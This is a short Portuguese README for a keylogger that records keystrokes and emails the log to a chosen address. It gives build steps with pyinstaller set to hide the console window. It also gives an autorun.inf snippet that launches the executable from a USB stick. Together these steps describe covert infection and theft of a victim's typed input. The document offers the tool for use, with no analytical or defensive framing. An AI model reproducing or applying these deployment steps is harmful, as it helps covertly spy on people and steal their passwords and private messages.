# Keylogger
[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

Programa feito para registrar teclas apertadas no teclado e enviar log para email desejado

# Para funcionamento ideal:

  - Executar o comando: pyinstaller --noconsole -w keyloger.py
  - Salvar arquivos no pendrive que deseja habilitar o autorun
  - Digitar o seguinte código dentro do pendrive:
  
```sh
[autorun]
;open=keyloger.exe
ShellExecute=keyloger.exe
````
